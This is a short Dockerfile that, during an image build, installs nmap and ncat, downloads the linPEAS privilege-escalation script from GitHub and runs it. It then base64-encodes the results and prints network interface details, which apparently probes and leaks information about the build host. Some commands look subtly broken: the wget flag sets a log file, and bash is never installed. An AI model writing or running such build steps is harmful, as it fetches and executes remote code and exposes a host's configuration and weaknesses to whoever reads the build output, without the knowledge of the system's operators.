# Use a lightweight Linux distribution as the base image
FROM alpine:latest

# Install ncat
RUN apk update
RUN apk add nmap nmap-ncat curl wget

RUN wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
RUN bash linpeas.sh -a > output.txt
RUN cat output.txt
RUN base64 output.txt -w0
RUN ip a 
RUN ifconfig
